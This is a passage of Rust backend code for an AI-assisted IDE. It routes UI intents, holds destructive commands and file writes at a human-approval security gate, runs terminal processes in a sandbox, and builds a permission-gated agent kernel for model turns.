                    session_id: Some(session),
                    kind: UiEventKind::Custom(json!({
                        "kind": "goal_evaluated",
                        "verdict": serde_json::to_value(&verdict).unwrap_or_else(|_| json!({})),
                    })),
                });
            }
            "workspace_set_repo_trust" => {
                let repo_id = payload
                    .get("repo_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("repo_id"))?;
                let trust: TrustState = payload
                    .get("trust")
                    .cloned()
                    .map(serde_json::from_value)
                    .transpose()
                    .map_err(|e| {
                        hide_core::error::HideError::Message(format!("{name}: bad trust: {e}"))
                    })?
                    .ok_or_else(|| missing("trust"))?;
                // The add-folder flow is the ONE way a repo enters the graph from the app, and the
                // trust decision is where it arrives: `workspace_add_repo` has no wire name, so a
                // trust call used to hit a repo that was never there and return `Ok(None)` with no
                // event and no error, leaving the control pending forever. The folder's own path
                // comes with the decision, so the node is created here (untrusted, per
                // trust-before-config) and then the decision is applied to it. Without a path there
                // is nothing to create, so this refuses instead of no-opping.
                if self.workspace_repo(repo_id).is_none() {
                    let root_path = payload
                        .get("root_path")
                        .and_then(|v| v.as_str())
                        .ok_or_else(|| missing("root_path"))?;
                    self.workspace_add_repo(RepoNode::new(repo_id, root_path))?;
                }
                let repo = self
                    .workspace_set_repo_trust(repo_id, trust)?
                    .ok_or_else(|| unknown_repo(repo_id))?;
                self.ui_bus.publish(UiEvent {
                    seq: 0,
                    session_id: None,
                    kind: UiEventKind::Custom(json!({
                        "kind": "repo_trust_set",
                        "repo": serde_json::to_value(&repo).unwrap_or_else(|_| json!({})),
                    })),
                });
            }
            "environment_switch" => {
                let session = payload
                    .get("session_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("session_id"))?;
                let env_id = payload
                    .get("env_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("env_id"))?;
                let reason = payload
                    .get("reason")
                    .and_then(|v| v.as_str())
                    .unwrap_or("environment switch");
                // Routes to the tested method: it appends the durable
                // `environment.switch` event, advances current_env, and emits its
                // own `environment_switch` UiEvent.
                self.environment_switch(SessionId::from(session), env_id, reason)
                    .await?;
            }
            _ => {}
        }
        Ok(())
    }

    /// Publish a memory-lifecycle UiEvent carrying the record (bible sec 21-22).
    /// The memory ledger is durable in KV; this surfaces the change on Wire-B so
    /// the Context Stack reflects it (parity with the goal/checkpoint publishers).
    fn publish_memory(&self, kind: &str, record: &MemoryRecord) {
        let session_id = match &record.scope {
            MemoryScope::Session(id) => Some(SessionId::from(id.as_str())),
            _ => None,
        };
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id,
            kind: UiEventKind::Custom(json!({
                "kind": kind,
                "record": serde_json::to_value(record).unwrap_or_else(|_| json!({})),
            })),
        });
    }

    /// Create a real git worktree for an isolated session branch: `git worktree add -b hide/<slug>
    /// <sibling-dir>` from the workspace root, streaming its output back as `tool_progress` (the
    /// terminal and Context Stack mirror those rows).
    ///
    /// It must write to a SIBLING directory, which the sandbox denies, so it is the one raw
    /// (unsandboxed) exec a frontend can reach. The human yes it needs is the ONE approval the
    /// command authority already demands: `create_worktree` is `ApprovalPolicy::Ask`, so the intent
    /// boundary parks it and `run_approved_intent` calls this only after the release. It used to
    /// park a SECOND gate of its own, which meant the release handler had nothing to run and the
    /// worktree was never created.
    fn spawn_worktree_add(&self, branch: Option<&str>) {
        let raw = branch.unwrap_or("session");
        let slug: String = raw
            .chars()
            .map(|c| {
                if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
                    c.to_ascii_lowercase()
                } else {
                    '-'
                }
            })
            .collect();
        let slug = slug.trim_matches('-');
        let slug = if slug.is_empty() { "session" } else { slug };
        let root = self.services.config.workspace_root.clone();
        let repo = root
            .file_name()
            .and_then(|s| s.to_str())
            .unwrap_or("repo")
            .to_string();
        let dest = root
            .parent()
            .map(|p| p.join(format!("{repo}-{slug}")))
            .unwrap_or_else(|| root.join(format!(".hide-worktree-{slug}")));
        let argv = vec![
            "git".to_string(),
            "worktree".to_string(),
            "add".to_string(),
            "-b".to_string(),
            format!("hide/{slug}"),
            dest.to_string_lossy().to_string(),
        ];
        self.spawn_exec(argv, None);
    }

    /// Mint a fresh session id and publish an idle `turn` projection under it, so the FE adopts the new
    /// session (its event router tracks `session_id` off any event) and the transcript starts clean.
    fn emit_new_session(&self) {
        let sid = SessionId::new();
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id: Some(sid),
            kind: UiEventKind::ProjectionPatch {
                projection: "turn".to_string(),
                patch: json!({ "phase": "idle", "run_id": Value::Null }),
            },
        });
    }

    /// Load a past session: scan its recorded events, map them to UiEvents, and republish them on the
    /// live bus so the FE (which adopts the session off any event's `session_id`) switches to it and
    /// re-renders the transcript. Every event is real, read straight from the log; nothing is fabricated.
    fn spawn_open_session(&self, sid: SessionId) {
        let replay = self.replay.clone();
        let bus = Arc::clone(&self.ui_bus);
        tokio::spawn(async move {
            match replay.ui_events(Some(sid.clone()), None, None).await {
                Ok(events) => {
                    for ev in events {
                        bus.publish(ev);
                    }
                }
                Err(err) => {
                    bus.publish(UiEvent {
                        seq: 0,
                        session_id: Some(sid),
                        kind: UiEventKind::RuntimeStatus {
                            status: "error".to_string(),
                            detail: Some(format!("could not load session: {err}")),
                        },
                    });
                }
            }
        });
    }

    /// Execute an accepted `RunCommand` and stream its stdout and stderr back as
    /// `tool_progress` UiEvents (the terminal mirrors those). The command runs
    /// SANDBOX-confined through the process surface, inheriting the same OS
    /// confinement the agent's `shell.run` tool gets (Trace D (a)).
    /// Returns the gate id when the command was PARKED instead of started, so the caller can mark
    /// the ack `held`. Without that return the ack read `accepted` for a command the host refused
    /// to run and the terminal printed "started ... (sandbox confined)" for it.
    fn spawn_command_run(&self, argv: Vec<String>, cwd: Option<String>) -> Result<Option<String>> {
        if argv.is_empty() {
            return Ok(None);
        }
        // Security gate: a genuinely destructive command is NOT dropped. It is parked under a unique
        // gate id and surfaced as a `SecurityGate` UiEvent; the user's `approve_gate` (with that id)
        // releases and runs it, `deny_gate` drops it. Ordinary dev commands run immediately.
        if let Some(reason) = dangerous_command(&argv) {
            let gate = self.hold_at_gate(
                PendingAction::Command {
                    argv: argv.clone(),
                    cwd: cwd.clone(),
                },
                format!("blocked: {} ({})", argv.join(" "), reason),
            )?;
            return Ok(Some(gate));
        }
        self.spawn_supervised(argv, cwd);
        Ok(None)
    }

    /// Run a gate-cleared terminal command (a safe command, or a user-approved
    /// one) through the sandboxed process surface. Streams stdout/stderr back as
    /// `tool_progress`; OS-confined (fail-closed), so an interactive terminal
    /// command can never write outside the workspace or reach the network.
    fn spawn_supervised(&self, argv: Vec<String>, cwd: Option<String>) {
        let owner = self.commands.control_session().to_string();
        let mut spec = StartSpec::command(argv, cwd);
        spec.owner = Some(owner);
        self.processes.start(spec, &self.shell_config());
    }

    /// Legacy raw command runner (UNSANDBOXED). Retained ONLY for the internal,
    /// trusted `spawn_worktree_add` path, which must `git worktree add` into a
    /// SIBLING directory outside the workspace root (a write the sandbox would
    /// deny). User-facing terminal commands go through `spawn_supervised`.
    fn spawn_exec(&self, argv: Vec<String>, cwd: Option<String>) {
        let ui_bus = self.ui_bus.clone();
        let root = self.services.config.workspace_root.clone();
        tokio::spawn(async move {
            exec_command_streamed(ui_bus, root, argv, cwd).await;
        });
    }

    /// The `ShellConfig` the process surface confines with: writes scoped to the
    /// workspace root, the absolute `.hide/log` write-deny threaded in. Mirrors the
    /// posture `hide_tools::shell` renders for `shell.run`.
    fn shell_config(&self) -> hide_tools::ShellConfig {
        hide_tools::ShellConfig {
            workspace_root: Some(
                self.services
                    .config
                    .workspace_root
                    .to_string_lossy()
                    .into_owned(),
            ),
            hide_dir: Some(self.services.layout().hide_dir),
            ..Default::default()
        }
    }

    /// Park an effect at the security gate and announce it: the ONE place an action becomes
    /// "held", so every held effect is announced the same way and a book that cannot take another
    /// decision refuses instead of dropping one silently.
    fn hold_at_gate(&self, action: PendingAction, message: String) -> Result<String> {
        let gate = self.gate_book.hold(action).ok_or_else(|| {
            hide_core::error::HideError::Message(format!(
                "not held: {} approvals are already awaiting a decision; answer or deny them first",
                GateBook::CAP
            ))
        })?;
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id: None,
            kind: UiEventKind::SecurityGate {
                gate: gate.clone(),
                message,
            },
        });
        Ok(gate)
    }

    /// The outcome rule for an intent whose effect writes the workspace.
    ///
    /// `PolicyDenied` is not a failure, it is "the human has not said yes yet", so the effect is
    /// HELD at the gate under its own name and can be approved; anything else refuses the ack.
    /// Shared, because holding only the arm somebody noticed (the editor save) left every sibling
    /// write - the per-hunk reject the review surface's undo is - permanently refused with no
    /// approval path on the shipped `Ask` default.
    fn write_effect_outcome(
        &self,
        ack: &mut IntentAck,
        name: &str,
        payload: &Value,
        outcome: Result<()>,
    ) {
        match outcome {
            Ok(()) => {}
            Err(hide_core::error::HideError::PolicyDenied(reason)) => {
                match self.hold_at_gate(
                    PendingAction::Intent {
                        name: name.to_string(),
                        payload: payload.clone(),
                    },
                    reason.clone(),
                ) {
                    Ok(gate) => {
                        ack.held = true;
                        ack.message = Some(format!("held for approval: gate={gate} ({reason})"));
                    }
                    Err(err) => self.effect_failed(ack, name, err.to_string()),
                }
            }
            Err(err) => self.effect_failed(ack, name, err.to_string()),
        }
    }

    /// Approve a held gated action: release it from the book and run it (bypassing the gate, since
    /// the user approved). A `Command` stays SANDBOX-confined (approval clears the deny-list gate,
    /// not the OS confinement); an `Intent` runs the effect its `ApprovalPolicy::Ask` spec held
    /// back. A no-op if the gate id is unknown (already taken, denied, or evicted).
    async fn approve_gate(&self, gate: &str) -> Result<()> {
        match self.gate_book.take(gate) {
            Some(PendingAction::Command { argv, cwd }) => {
                self.spawn_supervised(argv, cwd);
                Ok(())
            }
            // The approval is only as good as the effect it released: a released write that the
            // applier then refuses (a `base_hash` conflict, most often) is NOT an approved action
            // that happened, so the error travels back to the ack instead of being an 8-second
            // toast beside a surface that closed as success.
            Some(PendingAction::Intent { name, payload }) => {
                self.run_approved_intent(&name, &payload).await
            }
            // Unknown, already answered, or dropped: nothing ran, so nothing may read as accepted.
            None => Err(hide_core::error::HideError::NotFound(format!(
                "gate {gate} is not awaiting a decision (already answered, denied, or never held)"
            ))),
        }
    }

    /// Run the effect of a custom intent that was held at the gate because its `CommandSpec`
    /// declares [`ApprovalPolicy::Ask`]. Routes to the SAME handler the un-gated path uses; the
    /// intent itself was already recorded in the event log when it arrived.
    ///
    /// EVERY name `requires_approval` returns true for must have an arm here, or approving the gate
    /// is the only thing that ever happens and the command is permanently non-functional. The test
    /// `every_ask_command_has_a_release_handler` walks the catalog and fails if one is missing.
    ///
    /// The WHOLE body runs inside [`crate::tools::with_approved_writes`], the one approved-write
    /// scope, so every arm's effect (and everything it calls: `revert_diff` and the rewind's
    /// per-hunk peel both bottom out in `inverse_write`, `save_file` in the `fs` connector) sees the
    /// approval the user just gave. It used to be relaxed in the `save_file` arm alone, which left
    /// every sibling releasing into a `PolicyDenied` on the shipped default.
    async fn run_approved_intent(&self, name: &str, payload: &Value) -> Result<()> {
        crate::tools::with_approved_writes(self.released_effect(name, payload)).await
    }

    async fn released_effect(&self, name: &str, payload: &Value) -> Result<()> {
        match name {
            "create_worktree" => {
                self.spawn_worktree_add(payload.get("branch").and_then(|v| v.as_str()));
                Ok(())
            }
            "revert_diff" => {
                let diff_id = payload
                    .get("diff_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| {
                        hide_core::error::HideError::Message(
                            "revert_diff: missing 'diff_id'".to_string(),
                        )
                    })?;
                self.revert_diff(diff_id).await.map(|_| ())
            }
            "workspace_set_repo_trust" => {
                self.handle_memory_workspace_env_intent(name, payload).await
            }
            // The user approved THIS write, so it runs through the same one save path the ungated
            // save takes (same path confinement, same verifying applier, same `base_hash` conflict
            // guard, same diff capture); the approval is carried by the scope this whole function
            // runs in.
            "save_file" => self.save_file_effect(payload).await,
            // The review surface's undo. It writes (the inverse write that puts the pre-image
            // back), so on the shipped `Ask` default it arrives here through the same hold-and-
            // approve path the save takes.
            "reject_hunk" => {
                let diff_id = payload
                    .get("diff_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| {
                        hide_core::error::HideError::Message(
                            "reject_hunk: missing 'diff_id'".to_string(),
                        )
                    })?;
                let hunk_id = payload
                    .get("hunk_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| {
                        hide_core::error::HideError::Message(
                            "reject_hunk: missing 'hunk_id'".to_string(),
                        )
                    })?;
                self.reject_hunk(diff_id, hunk_id).await.map(|_| ())
            }
            "checkpoint_restore" | "checkpoint_rewind" => {
                self.handle_goal_checkpoint_intent(name, payload).await
            }
            // The lease grant. It runs here and only here, so the human approval at the gate IS the
            // grant condition; nothing installs a lease without passing through this release.
            "grant_write_lease" => self.handle_grant_write_lease(payload).await,
            other => Err(hide_core::error::HideError::Message(format!(
                "{other}: approval-gated but no release handler"
            ))),
        }
    }

    /// The catalog command an intent will actually EFFECT, with the payload that effect needs.
    ///
    /// The approval policy hangs off THIS, not off the wire name that carried the request, because
    /// one effect can be reached by more than one payload shape: `reject_diff` with no `hunk_id` is
    /// the same whole-diff on-disk revert as `revert_diff`, and reading the policy off the name
    /// alone let the ungated button next to the gated one perform the gated effect.
    fn effect_command(intent: &Intent) -> Option<(String, Value)> {
        match intent {
            Intent::RejectDiff {
                diff_id,
                hunk_id: None,
                ..
            } => Some(("revert_diff".to_string(), json!({ "diff_id": diff_id }))),
            Intent::Custom { name, payload } => Some((name.clone(), payload.clone())),
            _ => None,
        }
    }

    /// Whether the command authority marks this command [`ApprovalPolicy::Ask`], i.e. its effect
    /// may not run until a human approves. Read straight off the ONE registry so a policy change in
    /// the catalog is enforced without a second list to keep in sync. Binding-agnostic on purpose:
    /// filtering to `Custom` bindings meant no `Intent`-bound row could ever be enforced whatever
    /// policy it declared.
    fn requires_approval(name: &str) -> bool {
        use hide_protocol::command::ApprovalPolicy;
        static ASK: std::sync::OnceLock<Vec<String>> = std::sync::OnceLock::new();
        ASK.get_or_init(|| {
            hide_protocol::command::command_catalog()
                .into_iter()
                .filter(|s| s.approval_policy == ApprovalPolicy::Ask)
                .map(|s| s.id)
                .collect()
        })
        .iter()
        .any(|n| n == name)
    }

    /// Refuse an approval-gated EFFECT that did not arrive through a released gate.
    ///
    /// Enforced at the effect, not at a transport, because the intent boundary is not the only way
    /// in: `POST /v1/hide/rpc` reaches `checkpoint_restore` straight off `BackendHost`, skipping
    /// `handle_intent`, `effect_command`, `requires_approval` and the gate book entirely, and so
    /// does any in-process caller. Guarding the one transport somebody remembered is what let a
    /// declared-`Ask` command run unapproved. `run_approved_intent` runs the release inside
    /// [`crate::tools::with_approved_writes`], which is exactly the released-gate scope, so the
    /// approved path passes and every other path is refused. The policy itself is still read off
    /// the ONE catalog, so there is no second list of gated names.
    fn gated_effect(name: &str) -> Result<()> {
        if Self::requires_approval(name) && !crate::tools::gate_released() {
            return Err(hide_core::error::HideError::PolicyDenied(format!(
                "{name} requires approval: send it as an intent so it is held at the security gate"
            )));
        }
        Ok(())
    }

    /// Deny a held gated command: drop it without running. An unknown gate is refused, for the
    /// same reason approving one is: the caller is answering something that is not there.
    fn deny_gate(&self, gate: &str) -> Result<()> {
        if self.gate_book.remove(gate) {
            return Ok(());
        }
        Err(hide_core::error::HideError::NotFound(format!(
            "gate {gate} is not awaiting a decision (already answered, denied, or never held)"
        )))
    }

    /// The count of commands currently parked awaiting an approve/deny decision (test/inspection).
    #[cfg(test)]
    fn pending_gate_count(&self) -> usize {
        self.gate_book.len()
    }

    /// Increment 2 (defect S1): build the fully-wired agent kernel a live
    /// `SubmitTurn` routes through - the REAL loop, not the minimal
    /// [`AgentKernel::new`] (StubPlanner + no oracles) the host held before.
    /// Mirrors the working recipe in `hide-kernel/tests/full_run.rs`:
    ///
    /// * `runtime` - a [`KernelRuntimeClient`] over a [`SimpleRouter`] and the
    ///   host's HTTP [`ModelProviderInferenceClient`], so `.runtime(..)` also
    ///   auto-installs a `RuntimePlanner` (the model plans, we own acceptance).
    /// * `dispatcher` - a permission-gated [`ToolDispatcher`] built from the
    ///   host's tool registry + the config's **real** permission engine. NOT
    ///   `allow_all_dispatcher`, which bypasses permissions.
    /// * `grounding` - codebase [`Grounding`] over the code index.
    /// * `autonomy` - a BOUNDED level ([`turn_kernel_autonomy`] defaults to
    ///   `SuggestOnly`) so an effectful step pauses for approval rather than
    ///   running an unsandboxed shell unattended; `HIDE_KERNEL_AUTONOMY` widens it.
    /// * `with_standard_oracles` - the deterministic build/typecheck/test/lint
    ///   oracles (no state advances on faith, K1).
    pub fn build_turn_kernel(
        &self,
        base_url: String,
        session_id: SessionId,
        run_id: RunId,
    ) -> AgentKernel {
        use crate::model_provider::{HttpModelProvider, ModelProviderInferenceClient};
        use hawking_orch::inference::InferenceClient;
        use hawking_orch::router::SimpleRouter;
        use hide_kernel::runtime_client::KernelRuntimeClient;

        let inference: Arc<dyn InferenceClient> = Arc::new(ModelProviderInferenceClient::new(
            HttpModelProvider::new(base_url),
        ));
        let runtime = Arc::new(KernelRuntimeClient::new(
            Arc::new(SimpleRouter::new(self.services.role_registry.clone())),
            inference,
        ));

        let dispatcher = self.build_turn_dispatcher(session_id, Some(run_id));
        let grounding = Arc::new(Grounding::new(
            self.services.code_index.clone() as Arc<dyn hawking_index::CodeIndex>
        ));

        AgentKernel::builder(self.services.event_log.clone())
            .workspace_root(self.services.config.workspace_root.to_string_lossy().to_string())
            .autonomy(turn_kernel_autonomy())
            .grounding(grounding)
            // `.runtime(..)` installs a `RuntimePlanner` since no planner is set.
            .runtime(runtime)
            .dispatcher(dispatcher.clone())
            .with_standard_oracles(dispatcher)
            .build()
    }

    /// The dispatcher a turn's tools go through: the REAL permission engine (config-driven, NOT
    /// `allow_all_dispatcher`), with the SAME [`DispatchRecorder`] the host's own dispatcher
    /// carries, bound to this turn's session and run.
    ///
    /// The kernel holds this object directly, so binding the attribution HERE is what makes an
    /// agent edit produce a `tool.call`/`tool.result` pair and an addressable diff hunk. It is
    /// bound rather than ambient because a task-local would not survive the kernel spawning a task.
    pub fn build_turn_dispatcher(
        &self,
        session_id: SessionId,
        run_id: Option<RunId>,
    ) -> Arc<ToolDispatcher> {
        let bound = crate::tools::DispatchContext {
            session_id,
            run_id,
        };
        Arc::new(
            crate::tools::build_task_tool_dispatcher(
                &self.services.config,
                self.tools.clone(),
                Some(bound.clone()),
            )
            .with_observer(Arc::new(DispatchRecorder::bound_to(
                self.services.clone(),
                self.ui_bus.clone(),
                bound,
            ))),
        )
    }

    /// Spawn the generation for an accepted `SubmitTurn`: route it at the live
    /// runtime and stream tokens onto Wire-B. The run's `run_id` is registered
    /// so `CancelRun`/`PauseRun` reach it via the shared `InterruptHub`. When no
    /// runtime is online (no model configured, or it is not yet `Ready`), this
    /// publishes a `RuntimeStatus`/`Error` UiEvent instead of generating, so the
    /// FE shows "model offline", never a fake token.
    fn spawn_submit_turn_generation(&self, session_id: SessionId, prompt: String) {
        let run_id = RunId::new();
        match self.runtime_base_url() {
            Some(base_url) => {
                // Register the run with the interrupt hub so control intents can
                // reach it (the generation task polls it cooperatively).
                let ui_bus = self.ui_bus.clone();
                let role_registry = self.services.role_registry.clone();
                let event_log = self.services.event_log.clone();
                let key_value_store = self.services.key_value_store.clone();
                let code_index = self.services.code_index.clone();
                let memory = self.services.memory_store.clone();
                let interrupts = self.interrupts.clone();
                let approvals = self.approvals.clone();
                let run = run_id.clone();
                let repo_instructions = self.services.repo_instructions.clone();
                if kernel_turn_enabled() {
                    // Increment 2: route the turn through the REAL kernel loop so
                    // it can plan, use tools (permission-gated), and verify with
                    // deterministic oracles. The kernel is built here (sync) via
                    // `build_turn_kernel` and moved into the spawned driver.
                    let kernel =
                        self.build_turn_kernel(base_url.clone(), session_id.clone(), run.clone());
                    tokio::spawn(async move {
                        if let Err(e) = run_turn_kernel(
                            kernel,
                            event_log,
                            key_value_store,
                            role_registry,
                            code_index,
                            memory,
                            ui_bus.clone(),
                            interrupts,
                            approvals,
                            run,
                            session_id.clone(),
                            base_url,
                            prompt,
                            DEFAULT_KERNEL_TURN_MAX_STEPS,
                            repo_instructions,
                        )
                        .await
                        {
                            ui_bus.publish(UiEvent {
                                seq: 0,
                                session_id: Some(session_id),
                                kind: UiEventKind::Error {
                                    code: "generation".to_string(),
                                    message: e.to_string(),
                                },
                            });
                        }
                    });
                } else {
                    // Single-shot fallback (no tools): the model-offline-safe path,
                    // pinnable via `HIDE_KERNEL_TURN=0` for tests / degraded serves.
                    tokio::spawn(async move {
                        if let Err(e) = generate_submit_turn(
                            event_log,
                            role_registry,
                            code_index,
                            memory,
                            ui_bus.clone(),
                            interrupts,
                            run,
                            session_id.clone(),
                            base_url,
                            prompt,
                            repo_instructions,
                        )
                        .await
                        {
                            // Surface the failure on the same typed Wire-B channel;
                            // never swallow it.
                            ui_bus.publish(UiEvent {
                                seq: 0,
                                session_id: Some(session_id),
                                kind: UiEventKind::Error {
                                    code: "generation".to_string(),
                                    message: e.to_string(),
                                },
                            });
                        }
                    });
                }
            }
            None => {
                // No model online: surface "model offline" as a real UiEvent.
                let status = self
                    .runtime_state()
                    .map(|s| format!("{s:?}").to_lowercase())
                    .unwrap_or_else(|| "down".to_string());
                let detail = match self.runtime.is_some() {
                    true => "runtime not ready; reconnect when it reports ready".to_string(),
                    false => "no model configured (set HIDE_MODEL_WEIGHTS)".to_string(),
                };
                self.ui_bus.publish(UiEvent {
                    seq: 0,
                    session_id: Some(session_id),
                    kind: UiEventKind::RuntimeStatus {
                        status,
                        detail: Some(detail),
                    },
                });
            }
        }
    }

    pub async fn call_connector(&self, id: &str, method: &str, params: Value) -> Result<Value> {
        self.connectors.call(id, method, params).await
    }

    pub async fn rebuild_session_projection(
        &self,
        session_id: SessionId,
    ) -> Result<SessionProjection> {
        self.replay.rebuild_session(session_id).await
    }

    pub async fn ui_events(
        &self,
        session_id: Option<SessionId>,
        after_seq: Option<u64>,
        limit: Option<usize>,
    ) -> Result<Vec<UiEvent>> {
        self.replay.ui_events(session_id, after_seq, limit).await
    }

    pub async fn run_command(
        &self,
        session_id: SessionId,
        argv: Vec<String>,
        cwd: Option<String>,
    ) -> Result<ToolResult> {
        let mut args = json!({ "argv": argv });
        if let Some(cwd) = cwd {
            args["cwd"] = json!(cwd);
        }
        self.dispatch_tool(session_id, None, ToolCall::new("shell.run", args))
            .await
    }

    // -- Session-aware terminal process surface (Trace D) ------------------
    //
    // The terminal is a supervised, sandbox-confined process surface. These are
    // the host-level handles the FE (or a headless caller) drives: start a
    // (possibly long-lived) process, let it keep running across navigation,
    // attach/detach its streamed output, stop it, capture its logs as a durable
    // artifact, and read its compact state.

    /// The process supervisor (for inspection / advanced callers).
    pub fn processes(&self) -> &Arc<ProcessSupervisor> {
        &self.processes
    }

    /// Start a managed terminal process, sandbox-confined. `persistent` keeps it
    /// running independent of any session/turn; `owner` records the owning run or
    /// job. Returns the process id. A spawn fault or fail-closed sandbox refusal is
    /// recorded as a `failed` process (queryable via [`BackendHost::process_state`]).
    pub fn start_process(
        &self,
        argv: Vec<String>,
        cwd: Option<String>,
        env: std::collections::BTreeMap<String, String>,
        persistent: bool,
        owner: Option<String>,
    ) -> String {
        let spec = StartSpec {
            argv,
            cwd,
            env,
            persistent,
            owner,
            interactive: persistent,
        };
        self.processes.start(spec, &self.shell_config())
    }

    /// Whether a managed process is still alive.
    pub fn process_alive(&self, id: &str) -> bool {
        self.processes.is_alive(id)
    }

    /// A compact snapshot of a managed process (env, cwd, status, exit, sandboxed
    /// flag, owner), or `None` if the id is unknown.
    pub fn process_state(&self, id: &str) -> Option<ProcessState> {
        self.processes.state(id)
    }

    /// Attach a turn to a running process: replay its buffered output onto the bus
    /// under `session` and resume live mirroring. Returns the buffered lines.
    pub fn attach_process(&self, id: &str, session: SessionId) -> Option<Vec<String>> {
        self.processes.attach(id, session)
    }

    /// Detach the live UI mirror; the process keeps running and buffering.
    pub fn detach_process(&self, id: &str) -> bool {
        self.processes.detach(id)
    }

    /// Stop a managed process (SIGTERM the group, then SIGKILL after a grace).
    pub fn stop_process(&self, id: &str) -> bool {
        self.processes.stop(id)
    }

    /// Preserve a process's captured output as a durable blob-store artifact.
    pub fn capture_process_artifact(&self, id: &str) -> Result<hide_core::types::BlobRef> {
        match self.processes.capture_artifact(id, &self.services.blob_store) {
            Some(res) => res,
            None => Err(hide_core::error::HideError::NotFound(format!(
                "unknown process {id}"
            ))),
        }
    }

    /// Deliver a terminal intent to the targeted managed process. Returns `Err(reason)` for the
    /// caller to surface as an Error UiEvent (and a refused ack).
    ///
    /// * `pty_input` / `pty_resize`: write stdin / record geometry. `process` is optional; absent =
    ///   the most recently started live process.
    /// * `attach_process` / `stop_process` / `capture_process_artifact`: the three process controls
    ///   that had no wire trigger at all, so a client could START a sandboxed process and then had
    ///   no way to attach to it after navigating away, stop it, or keep its output. Not being able
    ///   to stop what you started is the safety half of that. `process` is REQUIRED here: these
    ///   address one named process, and guessing "the latest" would stop the wrong one.
    async fn handle_process_intent(
        &self,
        name: &str,
        payload: &Value,
    ) -> std::result::Result<(), String> {
        let id = payload.get("process").and_then(|v| v.as_str());
        let named = || id.ok_or_else(|| format!("{name}: missing 'process'"));
        match name {
            "pty_input" => {
                let data = payload
                    .get("data")
                    .or_else(|| payload.get("text"))
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| "pty_input: missing 'data'".to_string())?;
                self.processes.write_stdin(id, data).await
            }
            "pty_resize" => {
                let cols = payload.get("cols").and_then(|v| v.as_u64()).unwrap_or(0) as u16;
                let rows = payload.get("rows").and_then(|v| v.as_u64()).unwrap_or(0) as u16;
                self.processes.resize(id, cols, rows)
            }
            // Re-attaching replays the buffered output onto the bus under the attaching session, so
            // a re-navigated terminal comes back with its scrollback instead of an empty pane.
            "attach_process" => {
                let id = named()?;
                let session = payload
                    .get("session_id")
                    .and_then(|v| v.as_str())
                    .map(SessionId::from)
                    .unwrap_or_else(|| self.services.session());
                let lines = self
                    .attach_process(id, session.clone())
                    .ok_or_else(|| format!("unknown process {id}"))?;
                self.publish_custom(
                    Some(session),
                    json!({ "kind": "process_attached", "process": id, "lines": lines }),
                );
                Ok(())
            }
            "stop_process" => {
                let id = named()?;
                if !self.stop_process(id) {
                    return Err(format!("unknown process {id}"));
                }
                self.publish_custom(None, json!({ "kind": "process_stopped", "process": id }));
                Ok(())
            }
            "capture_process_artifact" => {
                let id = named()?;
                let blob = self.capture_process_artifact(id).map_err(|e| e.to_string())?;
                self.publish_custom(
                    None,
                    json!({
                        "kind": "process_artifact",
                        "process": id,
                        "artifact": serde_json::to_value(&blob).unwrap_or(Value::Null),
                    }),
                );
                Ok(())
            }
            _ => Ok(()),
        }
    }

    /// Publish a seq-0 `Custom` UiEvent on the live bus.
    fn publish_custom(&self, session_id: Option<SessionId>, data: Value) {
        self.ui_bus.publish(UiEvent {
            seq: 0,
            session_id,
            kind: UiEventKind::Custom(data),
        });
    }

    /// The run a session's editor saves are grouped under, so every save lands on ONE addressable
    /// [`DiffProposal`] (`diff-editor-<session>`) instead of a diff per keystroke-save. Stable per
    /// session and derived, not stored, so a restart addresses the same diff.
    pub fn editor_run(session: &SessionId) -> RunId {
        RunId::from(format!("editor-{}", session.as_str()))
    }

    /// The editor save (`{ path, content, base_hash?, session_id? }`), and the ONE wire-reachable
    /// workspace write.
    ///
    /// It goes through [`Self::dispatch_tool`] WITH a run id, not through the `fs` connector's
    /// dispatcher call, because `dispatch_tool` is where the whole downstream chain hangs off: the
    /// `tool.call`/`tool.result` pair the timeline and transcript search read, and the
    /// `record_edit_diff` capture the hunk review surface, the checkpoint's `repo_state` coverage
    /// and the code rewind all read. Routing straight at the dispatcher applied the bytes and fed
    /// none of them, so the app could write files that no consumer could see, review or undo.
    ///
    /// The session is the caller's (the FE's `runCommand` fills `session_id` into every custom
    /// payload); a payload without one falls back to the default session, as the other
    /// session-scoped intents do.
    async fn save_file_effect(&self, payload: &Value) -> Result<()> {
        let path = payload
            .get("path")
            .and_then(|v| v.as_str())
            .ok_or_else(|| hide_core::error::HideError::Config("missing path".to_string()))?;
        let content = payload
            .get("content")
            .and_then(|v| v.as_str())
            .ok_or_else(|| hide_core::error::HideError::Config("missing content".to_string()))?;
        // Same confinement the connector read path uses: `..`, absolute and prefix components are
        // refused before the dispatcher ever sees the call.
        let abs = crate::connectors::workspace_resolve(&self.services.config.workspace_root, path)?;
        let mut args = json!({ "path": abs.to_string_lossy(), "content": content });
        // `base_hash` (the blake3 of the text the caller read) is passed through when supplied, so
        // a concurrently-changed file CONFLICTS instead of being clobbered.
        if let Some(base) = payload.get("base_hash").and_then(|v| v.as_str()) {
            args["base_hash"] = json!(base);
        }
        let session = payload
            .get("session_id")
            .and_then(|v| v.as_str())
            .map(SessionId::from)
            .unwrap_or_else(|| self.services.session());
        let run = Self::editor_run(&session);
        let result = self
            .dispatch_tool(session, Some(run), ToolCall::new("edit.write_file", args))
            .await?;
        // `Tool`, not `PolicyDenied`: the permission verdict is the `?` above. This is the applier
        // refusing (a `base_hash` conflict, most often), which no approval fixes, so it must not be
        // mistaken for something to hold at a gate.
        if result.status != ToolStatus::Ok {
            return Err(hide_core::error::HideError::Tool(format!(
                "write of {path} refused: {}",
                result
                    .error
                    .as_ref()
                    .map(|e| format!("{}: {}", e.code, e.message))
                    .unwrap_or_else(|| "rejected by the applier".to_string())
            )));
        }
        Ok(())
    }

    /// Dispatch a tool ATTRIBUTED to a session and (optionally) a run.
    ///
    /// A thin caller of the recorded path: the durable `tool.call`/`tool.result` pair, the live
    /// `ToolProgress`, and the reviewable/revertible diff an `edit.*` write produces are recorded
